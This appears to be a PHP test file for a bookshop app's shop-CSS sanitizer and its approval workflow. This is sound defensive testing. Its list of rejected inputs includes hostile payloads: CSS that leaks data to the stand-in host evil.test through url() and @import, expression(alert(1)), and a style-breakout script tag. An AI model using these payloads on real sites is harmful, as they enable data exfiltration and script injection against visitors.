<?php

use App\Domains\Bookshop\Models\Vendor;
use App\Domains\Bookshop\Models\VendorMember;
use App\Domains\Bookshop\Models\VendorStorefront;
use App\Domains\Bookshop\Support\CustomCss;
use App\Domains\Identity\Models\User;
use App\Domains\Notifications\Models\UserNotification;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;

uses(RefreshDatabase::class);

/**
 * B10c (ADR-039): a shop's own CSS — cleaned, every selector confined to
 * the shop's part of its page, nothing fetched from elsewhere; shown in the
 * shop's preview at once and to visitors only once the office approves it;
 * removable by the shop and takeable-down by the office at any time.
 */
function cssShop(string $slug = 'fitrah'): array
{
    Role::findOrCreate('vendor', 'web');
    $vendor = Vendor::query()->create(['name' => ucfirst($slug), 'slug' => $slug, 'code' => strtoupper(substr($slug, 0, 3)), 'status' => 'active']);
    $owner = User::factory()->create();
    VendorMember::query()->create(['vendor_id' => $vendor->id, 'user_id' => $owner->id, 'role' => 'owner', 'agreement_accepted_at' => now()]);

    return [$vendor, $owner];
}

function cssAs(?User $user = null)
{
    $t = test()->withoutLocalizationMiddleware();
    if ($user === null) {
        app('auth')->forgetGuards();

        return $t;
    }

    return $t->actingAs($user);
}

function cssOffice(): User
{
    Permission::findOrCreate('bookshop.manage', 'web');
    Role::findOrCreate('admin', 'web')->givePermissionTo('bookshop.manage');
    $office = User::factory()->create();
    $office->assignRole('admin');

    return $office;
}

it('confines every rule to the shop and refuses anything that fetches, runs or covers the page', function () {
    expect(CustomCss::clean('body { background: #fff } h2, .sf-card:hover > a { color: red }')['css'])
        ->toBe(".storefront { background: #fff; }\n.storefront h2, .storefront .sf-card:hover > a { color: red; }");
    expect(CustomCss::clean('@media (max-width: 600px) { :root { --x: 1px } p { margin: 0 } }')['css'])
        ->toContain('@media (max-width: 600px)')->toContain('.storefront { --x: 1px; }')->toContain('.storefront p { margin: 0; }');
    expect(CustomCss::clean('a{color:red} /* note */')['css'])->toBe('.storefront a { color:red; }');

    foreach ([
        "a[href^='x'] { background: url(https://evil.test/?leak) }" => 'url',
        "@import 'https://evil.test/x.css';" => 'import',
        '.a { width: expression(alert(1)) }' => 'script',
        '.a { background: u\72l(x) }' => 'escape',
        '</style><script>alert(1)</script>' => 'markup',
        '.a { position: fixed; inset: 0 }' => 'fixed',
        '@font-face { font-family: x }' => 'font_face',
        '@page { margin: 0 }' => 'at_rule',
        '.a { color: red } }' => 'braces',
        'color: red;' => 'braces',
        '.a { .b { color: red } }' => 'nesting',
    ] as $css => $reason) {
        expect(CustomCss::clean($css))->toBe(['css' => '', 'errors' => [$reason]], $css);
    }
    expect(CustomCss::clean(str_repeat('a{b:c}', 5000))['errors'])->toBe(['too_long']);
});

it('shows the shop its CSS in the preview at once, and visitors only once the office approves', function () {
    [$fitrah, $owner] = cssShop();
    $staff = User::factory()->create();
    VendorMember::query()->create(['vendor_id' => $fitrah->id, 'user_id' => $staff->id, 'role' => 'staff', 'agreement_accepted_at' => now()]);
    $office = cssOffice();
    cssAs($owner)->post(route('vendor.storefront.draft'), ['theme' => ['preset' => 'ocean']])->assertSessionHasNoErrors();
    cssAs($owner)->post(route('vendor.storefront.publish'))->assertSessionHasNoErrors();

    cssAs($staff)->post(route('vendor.storefront.css'), ['css' => 'h2 { letter-spacing: .1em }'])->assertForbidden();
    cssAs($owner)->post(route('vendor.storefront.css'), ['css' => 'h2 { background: url(x) }'])->assertSessionHasErrors('css');
    cssAs($owner)->post(route('vendor.storefront.css'), ['css' => 'h2 { letter-spacing: .1em }'])->assertSessionHasNoErrors();
    $storefront = VendorStorefront::query()->where('vendor_id', $fitrah->id)->sole();
    expect($storefront->custom_css_status)->toBe('pending')->and($storefront->custom_css_pending)->toBe('.storefront h2 { letter-spacing: .1em; }')->and($storefront->custom_css)->toBeNull();
    expect(UserNotification::query()->where('user_id', $office->id)->where('title', __('shop.notice_css_submitted_title'))->exists())->toBeTrue();

    // The preview has it; the public page does not, yet.
    cssAs($owner)->get(route('vendor.storefront.preview'))->assertSee('.storefront h2 { letter-spacing: .1em; }', false)->assertSee('contain: paint', false);
    cssAs()->get(route('public.shop.vendor', 'fitrah'))->assertOk()->assertDontSee('letter-spacing: .1em', false)->assertDontSee('data-testid="shop-custom-css"', false);
    cssAs($owner)->get(route('vendor.storefront.index'))->assertInertia(fn ($page) => $page->where('custom_css.status', 'pending')->where('custom_css.pending', '.storefront h2 { letter-spacing: .1em; }'));

    // Sent back with a note, then approved: live.
    cssAs($owner)->post(route('admin.bookshop.storefront.css', $fitrah->id), ['decision' => 'approve'])->assertForbidden();
    cssAs($office)->get(route('admin.bookshop.index'))->assertInertia(fn ($page) => $page->where('custom_css.0.slug', 'fitrah')->where('custom_css.0.status', 'pending'));
    cssAs($office)->post(route('admin.bookshop.storefront.css', $fitrah->id), ['decision' => 'decline'])->assertSessionHasErrors('note');
    cssAs($office)->post(route('admin.bookshop.storefront.css', $fitrah->id), ['decision' => 'decline', 'note' => 'Too wide'])->assertSessionHasNoErrors();
    expect($storefront->refresh()->custom_css_status)->toBe('declined');
    cssAs($owner)->post(route('vendor.storefront.css'), ['css' => 'h2 { letter-spacing: .05em }']);
    cssAs($office)->post(route('admin.bookshop.storefront.css', $fitrah->id), ['decision' => 'approve'])->assertSessionHasNoErrors();
    expect($storefront->refresh()->custom_css)->toBe('.storefront h2 { letter-spacing: .05em; }')->and($storefront->custom_css_pending)->toBeNull();
    expect(UserNotification::query()->where('user_id', $owner->id)->where('title', __('shop.notice_css_approved_title'))->exists())->toBeTrue();
    cssAs()->get(route('public.shop.vendor', 'fitrah'))->assertSee('data-testid="shop-custom-css"', false)->assertSee('.storefront h2 { letter-spacing: .05em; }', false);

    // A new version waits while the approved one stays live.
    cssAs($owner)->post(route('vendor.storefront.css'), ['css' => 'h2 { color: red }']);
    cssAs()->get(route('public.shop.vendor', 'fitrah'))->assertSee('letter-spacing: .05em', false)->assertDontSee('color: red', false);

    // The office takes the live one down (a note needed); the shop removes its own at once.
    cssAs($office)->post(route('admin.bookshop.storefront.css', $fitrah->id), ['decision' => 'take_down', 'note' => 'Hides the prices'])->assertSessionHasNoErrors();
    cssAs()->get(route('public.shop.vendor', 'fitrah'))->assertDontSee('data-testid="shop-custom-css"', false);
    expect($storefront->refresh()->custom_css_status)->toBe('pending');
    cssAs($owner)->post(route('vendor.storefront.css.remove'))->assertSessionHasNoErrors();
    expect($storefront->refresh()->custom_css)->toBeNull()->and($storefront->custom_css_pending)->toBeNull()->and($storefront->custom_css_status)->toBeNull();
});

it('keeps each shop to its own CSS', function () {
    [$fitrah, $owner] = cssShop();
    [$noor, $noorOwner] = cssShop('noor');
    cssAs($owner)->post(route('vendor.storefront.css'), ['css' => 'h2 { color: teal }']);
    cssAs($noorOwner)->get(route('vendor.storefront.index'))->assertInertia(fn ($page) => $page->where('custom_css.pending', null)->where('custom_css.live', null));
    cssAs($noorOwner)->post(route('vendor.storefront.css.remove'));
    expect(VendorStorefront::query()->where('vendor_id', $fitrah->id)->value('custom_css_pending'))->toBe('.storefront h2 { color: teal; }');
});
